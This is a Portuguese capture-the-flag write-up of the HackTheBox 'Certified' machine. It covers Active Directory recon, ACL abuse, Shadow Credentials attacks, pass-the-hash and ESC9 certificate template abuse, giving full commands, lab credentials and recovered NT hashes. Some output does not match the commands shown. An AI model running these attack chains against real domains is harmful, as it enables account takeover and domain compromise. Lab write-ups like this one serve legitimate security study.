+++
title = 'Certified'
date = 2024-01-14T07:07:07+01:00
draft = true
+++

# Certified

{{< figure src="/assets/image (27).png" alt="">}}

## Recon

Nessa máquina começamos com o IP `10.10.11.41` e com as credenciais `judith.mader:judith09` . Vamos começar mapeando a rede com nmap:

```bash
# Nmap 7.94SVN scan initiated Sun Nov 10 17:03:33 2024 as: /usr/lib/nmap/nmap --privileged --min-rate=10000 -p- -A -oA nmap/certified 10.10.11.41
Nmap scan report for 10.10.11.41
Host is up (0.19s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-11 05:03:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-11T05:05:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-11T05:05:31+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-11T05:05:33+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-11T05:05:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
50720/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-11T05:04:55
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   192.70 ms 10.10.14.1
2   193.69 ms 10.10.11.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 10 17:05:33 2024 -- 1 IP address (1 host up) scanned in 120.32 seconds


```

Sabemos agora que temos um servidor Windows com Active Directory operando, e podemos começar a testar a credencial que temos disponível.

### SMB

Começo listando os compartilhamentos do SMB com o usuário `judith.meder` que temos disponível:

```bash
nxc smb 10.10.11.41 -d "certified.htb" -u "judith.mader" -p "judith09" --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share

```

Temos acesso de leitura nas pastas comum do SMB, e não tem nenhuma informação valiosa para a gente nessas pastas.

O próximo passo que fiz foi usar da credencial válida para enumerar outros usuários com bruteforce de RID:

```bash
nxc smb 10.10.11.41 -d "certified.htb" -u "judith.mader" -p "judith09" --rid-brute


SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domai
n:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.10.11.41     445    DC01             498: CERTIFIED\Enterprise Read-only Domain Controllers (SidType
Group)
SMB         10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB         10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB         10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB         10.10.11.41     445    DC01             512: CERTIFIED\Domain Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             513: CERTIFIED\Domain Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             514: CERTIFIED\Domain Guests (SidTypeGroup)
SMB         10.10.11.41     445    DC01             515: CERTIFIED\Domain Computers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             516: CERTIFIED\Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             517: CERTIFIED\Cert Publishers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             518: CERTIFIED\Schema Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             519: CERTIFIED\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             520: CERTIFIED\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.41     445    DC01             521: CERTIFIED\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             522: CERTIFIED\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             525: CERTIFIED\Protected Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             526: CERTIFIED\Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             527: CERTIFIED\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             553: CERTIFIED\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             571: CERTIFIED\Allowed RODC Password Replication Group (SidType
Alias)
SMB         10.10.11.41     445    DC01             572: CERTIFIED\Denied RODC Password Replication Group (SidTypeA
lias)
SMB         10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB         10.10.11.41     445    DC01             1101: CERTIFIED\DnsAdmins (SidTypeAlias)
SMB         10.10.11.41     445    DC01             1102: CERTIFIED\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB         10.10.11.41     445    DC01             1104: CERTIFIED\Management (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB         10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB         10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB         10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB         10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

E com isso consigo uma boa lista de outros possíveis usuários do sistema:

```
judith.mader
Administrator
Guest
krbtgt
judith.mader
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

Com o kerbrute, podemos testar se os usuários são válidos no sistema:

```bash
kerbrute userenum -d certified.htb  --dc DC01.certified.htb users_cleaned.txt


    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/21/24 - Ronnie Flathers @ropnop

2024/12/21 13:34:53 >  Using KDC(s):
2024/12/21 13:34:53 >   DC01.certified.htb:88

2024/12/21 13:34:54 >  [+] VALID USERNAME:       harry.wilson@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       Administrator@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       gregory.cameron@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       management_svc@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       alexander.huges@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       judith.mader@certified.htb
2024/12/21 13:34:54 >  [+] VALID USERNAME:       ca_operator@certified.htb
2024/12/21 13:34:54 >  Done! Tested 9 usernames (7 valid) in 0.525 seconds
```

Com os usuários válidos, tento ver qual deles eu consigo acessar as pastas via SMB, tentando autenticar sem passar senha, mas nenhum funcionou.

```bash
nxc smb 10.10.11.41 -d "certified.htb" -u docs/users_cleaned.txt -p "" --continue-on-success
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\Administrator: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\Guest: STATUS_ACCOUNT_DISABLED
SMB         10.10.11.41     445    DC01             [-] certified.htb\krbtgt: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\judith.mader: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\management_svc: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\ca_operator: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\alexander.huges: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\harry.wilson: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [-] certified.htb\gregory.cameron: STATUS_LOGON_FAILURE
```

### AD ACL

Sem muitas possibilidades com o SMB, podemos tentar enumerar como o active directory está configurado e entender melhor o nosso contexto para pensar em mais possibilidades. Decido usar o bloodhound para esse fim: `bloodhound-python -c All -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -v` .\
A melhor query eu eu consegui achar para esse grafo foi a padrão "Find shortest paths do Domain Admin":

{{< figure src="/assets/image (26).png" alt="">}}

Com esse grafo e as credenciais de Judith Mader, podemos começar a estudar e pensar em formas de abusar das permissões que temos para conseguir uma escalação lateral dentro do AD e conseguir conta com mais permissões. No nosso contexto, o usuário `management_svc` possui `CanPSRemote` na máquina, o que nos indicar que com esse usuário podemos finalmente interagir com comandos no servidor. \
Estudando melhor a configuração representada pelo grafo do bloodhound, já se torna possível pensar em algumas possibilidades.&#x20;

`Judith.Mader` possui permissão `WriteOwner` no grupo `Management`, que por sua vez possui permissão de `GenericWrite` em `management_svc` . Estudando melhor sobre essas permissões podemos entender que em uma visão geral, `Judith.Mader` consegue adicionar ela mesma e o `management_svc` no grupo `management`, ganhando permissão de `GenericWrite` sobre ele, o que permite ataques de `Shadow Credentials` em cima dele.

O primeiro passo do plano de ataque é inserir Judith.Mader no grupo Management, usando o comando `net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"`, porém todas as tentativas me dão como resposta erro de acesso negado. Com a permissão de `WriteOwner` podemos editar as permissões no grupo com o comando `impacket-dacledit -action "write" -rights "WriteMembers" -principal "judith.mader" -target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" "certified.htb"/"judith.mader":"judith09"`\
Agora consigo adicionar os usuários no grupo Management:

```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"

CERTIFIED\judith.mader

```

```bash
net rpc group members "Management" "management_svc" -U "certified.htb/judith.mader%judith09" -S "DC01.certified.htb"

CERTIFIED\management_svc
```

Agora, o usuário Judith.Mader possui GenericWrite em management\_svc, podemos aplicar um ataque Shadow Credentials para conseguir a Hash NTLM desse usuário. Para isso, uso o `pywhisker` para performar esse ataque.

```bash
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "list"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Listing devices for management_svc
[*] DeviceID: c4568b67-d5e8-b87b-ef31-7fa806252d1d | Creation Time (UTC): 2024-12-11 01:56:47.508152
```

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "info" --device-id c4568b67-d5e8-b87b-ef31-7fa806252d1d
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[+] Found device Id
<KeyCredential structure at 0x7faaa64a2c30>
  | Owner: CN=management service,CN=Users,DC=certified,DC=htb
  | Version: 0x200
  | KeyID: Wot7a3/O7rRj1H4RmoADdyRDvSOtaN4VD92IPnUZfFk=
  | KeyHash: 2041f6072ebb7d1936c0d0a9e6e032803b555502cda83b7c8e6e9be5a25183d1
  | RawKeyMaterial: <dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7faaa64a2a50>
  |  | Exponent (E): 65537
  |  | Modulus (N): 0xcbfde43f160e5c77028303329f742921d823d9dd940b6bb07b704695877d84d4161abf033a59a39856e12ff66de946bccfc48a27685b5d8ca63c499135a6516ac8c8ba3eb53116f0c283531c9b253851c99b2170a2a858ce0e7e77ba1268c58a6dac0ad4e425536ad079bc3a7bf65e14476c10f40ba2e9d8a32cba73eada2892e95a2f8fc425175f8bbc2067e82a846bd2f0af5a8d1954afab8bf138ec61bf70197ae38ce10581dbd00b427f1458cfbbe330046a94582f9457a5fbc919260901c657592a81fa9bfb7598e99fa1c71c0db5d79fc6a39e6fde515919e4bda77dfaa2ef72702a2d1276b5f8f28a9cac7bba95d41e51b79f0b7d7d03ed92efd7a1f7
  |  | Prime1 (P): 0x0
  |  | Prime2 (Q): 0x0
  | Usage: KeyUsage.NGC
  | LegacyUsage: None
  | Source: KeySource.AD
  | DeviceId: c4568b67-d5e8-b87b-ef31-7fa806252d1d
  | CustomKeyInfo: <CustomKeyInformation at 0x7faaa64835c0>
  |  | Version: 1
  |  | Flags: KeyFlags.NONE
  |  | VolumeType: None
  |  | SupportsNotification: None
  |  | FekKeyVersion: None
  |  | Strength: None
  |  | Reserved: None
  |  | EncodedExtendedCKI: None
  | LastLogonTime (UTC): 2024-12-11 01:56:47.508152
  | CreationTime (UTC): 2024-12-11 01:56:47.508152
```

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --filename out
```

```bash
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --filename out
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e47e562c-9fda-5ce2-133c-d9fd0d2c30dc
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: out.pfx
[*] Must be used with password: lYu56sxIfremvd8Zycep
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```bash
python3 gettgtpkinit.py -cert-pfx out.pfx -pfx-pass lYu56sxIfremvd8Zycep certified.htb/management_svc management_svc.ccache
2024-12-11 03:10:35,549 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-11 03:10:35,562 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-11 03:10:35,976 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-11 03:10:35,976 minikerberos INFO     9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0850b86ef350
INFO:minikerberos:9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0850b86ef350
2024-12-11 03:10:35,979 minikerberos INFO     Saved TGT to file
```

```bash
(venv) ➜  PKINITtools git:(master) ✗ export KRB5CCNAME=management_svc.ccache
(venv) ➜  PKINITtools git:(master) ✗ python3 getnthash.py -key 9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0
850b86ef350 certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
/home/art/bin/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and schedul
ed for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(
datetime.UTC).
  now = datetime.datetime.utcnow()
/home/art/bin/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and schedul
ed for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(
datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

Agora temos a Hash `a091c1832bcdd4677c28b5a6a1295584`  do usuário management\_svc e podemos nos autenticar como ele usando `Pass the Hash` e, como esse usuário tem `CanPSRemote`  na máquina, podemos nos conectar usando evil-winrm e a hash do usuário: `evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584`&#x20;

{{< figure src="/assets/image (186).png" alt="">}}

## Shell como CA Operator

Agora como management\_svc, começo a olhar as conexões desse usuário no grafo do bloodhound, e encontro essa ligação:

{{< figure src="/assets/image (187).png" alt="">}}

Tendo permissão de `GenericAll`  sobre `ca_operator`, permite com que `management_svc` aplique o ataque de `Shadow Credentials` e consiga a NTHASH de `ca_operator`&#x20;

```bash
certipy-ad shadow auto -username "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e'
[*] Adding Key Credential with device ID '0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e' to the Key Credentials for 'ca_opera
tor'
[*] Successfully added Key Credential with device ID '0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e' to the Key Credentials f
or 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': 8034586795ebaf0427cc3417ebea341c
```



## &#x20;ROOT - ESC9

Nesse momento acabei ficando sem ideias, então minha intenção foi estudar o meu novo acesso como `ca_operator` e me aprofundar no novo contexto que eu estava inserido. Fazendo esse novo reconhecimento, ao analisar os templates de certificado de autoridade com `certipy-ad`, acabamos descobrindo que `ca_operator` está registrado em um template vulnerável a vulnerabilidade `ESC9`, a qual podemos abusar para conseguir acesso de administrador no sistema.

```bash
certipy-ad find -u 'ca_operator' -hashes :8034586795ebaf0427cc3417ebea341c  -dc-ip 10.10.11.41 -vulnerable -enabled
```

{{< figure src="/assets/image (23).png" alt="">}}

Essa vulnerabilidade é bem documentada, e podemos seguir essa documentação para conseguir explorar com sucesso. No nosso contexto atual temos essas informações para realizar o ataque:

```
Nome do certificado: certified-DC01-CA
management_svc -> GenericWrite sobre ca_operator
ca_operator hash: 8034586795ebaf0427cc3417ebea341c
```

Os passos realizados são os seguintes:

* o `userPrincipalName` de ca\_operator é modificado para qual usuário queremos a Hash (administrator no nosso caso)

```bash
certipy-ad account update -username "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator


[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

* O ceritifcado vulneravel é chamado pelo ca\_operator

```bash
certipy-ad req -username "ca_operator@certified.htb" -hashes :8034586795ebaf0427cc3417ebea341c -target 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
  "(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ",
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'ca_operator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ca_operator.pfx'
```

* O UPN de ca\_operator é modificado para qualquer outro valor

```bash
certipy-ad account update -username "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn "ca_operator@certified.htb"
```

* Agora, podemos nos autenticar com o certificado obtido e ler o NTHASH do usuário que estava no UPN no momento em que o certificado foi ixado (Administrator)

```bash
certipy-ad auth -pfx 'administrator.pfx' -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Agora, temos a hash do administrator do AD, e podemos nos autenticar utilizando Pass the Hash, e conseguir uma shell através do evil-winrm por exemplo:

{{< figure src="/assets/image (25).png" alt="">}}
